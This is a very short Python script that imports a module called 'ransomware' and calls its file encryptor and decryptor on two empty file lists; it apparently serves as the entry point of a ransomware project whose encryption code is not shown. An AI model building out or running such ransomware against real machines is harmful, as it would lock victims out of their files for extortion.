import os
import ctypes
from RSA import ransomware
list_f = []
list_d = []
ransomware.encryptor(ransomware.getFile(list_f))
ransomware.decrypt(ransomware.getFile(list_d))
